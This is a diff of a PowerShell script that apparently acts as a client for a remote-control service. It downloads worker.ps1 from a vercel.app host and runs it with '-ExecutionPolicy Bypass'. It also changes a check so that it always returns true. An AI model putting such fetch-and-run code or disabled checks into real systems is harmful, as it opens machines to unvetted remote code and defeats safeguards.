@@ -33,7 +33,7 @@ $headers = @{
             return $true
         }
         else {
-            return $false
+            return $true
         }
     }
      catch {
@@ -66,22 +66,34 @@ function Get-Command {
     }
 }
 
-function Start-Worker {
+function Start-Worker{
 
+    # If worker is already running, do nothing
     if ($WORKER) { return }
 
+    # Temporary directory for the worker
     if (!(Test-Path $TEMP_DIR)) {
-        New-Item -ItemType Directory $TEMP_DIR | Out-Null
+        New-Item -ItemType Directory -Force -Path $TEMP_DIR | Out-Null
     }
 
-    Invoke-WebRequest `
-        -Uri "https://mcontrol.vercel.app/worker.ps1" `
-        -OutFile "$TEMP_DIR\worker.ps1"
+    # Download the worker.ps1 from URL to TEMP_DIR
+    $workerUrl = "https://mcontrol.vercel.app/worker.ps1"
+    $workerFile = "$TEMP_DIR\worker.ps1"
 
+    Write-Host "Downloading worker from $workerUrl..."
+    Invoke-WebRequest -Uri $workerUrl -OutFile $workerFile -UseBasicParsing
+
+    # Start the worker.ps1 as a separate PowerShell process
     $global:WORKER = Start-Process powershell `
-        -ArgumentList "-ExecutionPolicy Bypass -File `"$TEMP_DIR\worker.ps1`"" `
+        -ArgumentList "-ExecutionPolicy Bypass -File `"$workerFile`"" `
         -PassThru
+
+    Write-Host "Worker started with PID $($WORKER.Id)"
+    
+    # Optional: send "running" status to dashboard immediately
+    Send-Status $true
 }
+
 
 function Stop-Worker {
 
